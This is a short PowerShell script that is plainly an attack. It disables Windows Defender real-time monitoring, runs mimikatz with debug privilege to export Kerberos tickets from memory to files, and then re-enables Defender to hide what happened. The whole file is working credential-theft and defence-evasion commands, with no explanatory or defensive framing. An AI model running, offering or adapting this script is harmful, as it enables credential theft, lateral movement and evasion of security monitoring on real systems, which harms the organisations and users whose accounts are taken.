<# Disable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $true

<# Attack #>
. C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "log log.txt" "privilege::debug" "sekurlsa::tickets /export" "exit"

<# Enable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $false